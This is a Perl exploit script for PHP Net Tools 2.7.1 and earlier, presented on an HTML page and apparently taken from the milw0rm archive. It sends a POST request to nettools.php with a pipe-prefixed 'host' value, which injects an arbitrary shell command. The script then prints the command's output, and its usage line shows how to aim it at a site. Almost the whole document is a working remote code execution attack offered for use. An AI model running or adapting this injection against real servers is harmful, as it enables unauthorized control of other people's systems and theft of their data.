<html><head><title>PHP Net Tools <= 2.7.1 Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
# PHP Net Tools Remote Code Execution Exploit
#
# by FOX_MULDER (fox_mulder@abv.bg)
# Vulnerability found by FOX_MULDER.
#
# &quot;Born to be root !!!&quot;
#----------------------------------+
#PHP Net Tools                     |
#Copyright (C) 2005 Eric Robertson |
#h4rdc0d3@gmail.com                |
#----------------------------------+
#
# Fact:Wbyte counted twice to infinity !!!
#
#
###################################################
	use LWP 5.64;

	my $hostname = $ARGV[0];
	my $dir = $ARGV[1];
	my $command = $ARGV[2];

        if (@ARGV&lt;2) {
	print &quot;\nUsage: ntools.pl www.site.com /dir/ \&quot;ls \-la\&quot; \n&quot;;
	exit();
	}
	
	print &quot;=======================================================\n&quot;;
	print &quot;0day 0day 0day 0day 0day 0day 0day 0day 0day 0day 0day\n&quot;;
	print &quot;PHP Net Tools Command Execution Exploit by FOX_MULDER\n&quot;;
	print &quot;fox_mulder@abv.bg\r\n&quot;;
	print &quot;=======================================================\n&quot;;

	my $browser = LWP::UserAgent-&gt;new;
	$browser-&gt;agent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');
	print &quot;\n\n[+]Sending request to server . . .\r\n&quot;;
	
	my $url = &quot;http://$hostname$dir/nettools.php&quot;;

	
	my $response = $browser-&gt;post( $url,[
		'ping' =&gt; '1',
        	'host' =&gt; &quot;|$command&quot;]);

 	my $code = $response-&gt;status_line;
        print &quot;[+] HTTP RESPONSE $code\n&quot;;
        print &quot;\n[+]Injecting command . . .\n&quot;;
	$response-&gt;content =~ /blockquote&gt;(.*)&lt;\/blockquote&gt;/s;
	print &quot;$1\n&quot;;

# milw0rm.com [2006-04-18]</pre></html>